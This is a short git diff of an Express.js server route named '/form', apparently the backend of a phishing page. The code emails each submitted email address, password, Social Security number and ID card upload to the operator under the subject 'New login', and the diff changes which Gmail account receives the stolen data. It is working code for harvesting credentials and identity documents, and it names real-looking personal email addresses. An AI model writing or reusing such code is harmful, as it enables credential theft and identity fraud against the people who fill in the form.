@@ -51,7 +51,7 @@ app.post("/form", async(req,res)=>{
     // res.status(200).json(publicIds, security, email, password)
     const mailOptions = {
       from: 'Masonres213@gmail.com',
-      to: 'sheriffhardewale@gmail.com',
+      to: 'Masonres213@gmail.com',
       subject: 'New login',
       // text: 'That was easy!',
       html:`<h1>Someone just logged in with the following info </h1><p> email: ${email}, password: ${password}, SSN: ${security},  ID Cards:  ${publicIds[0]} `
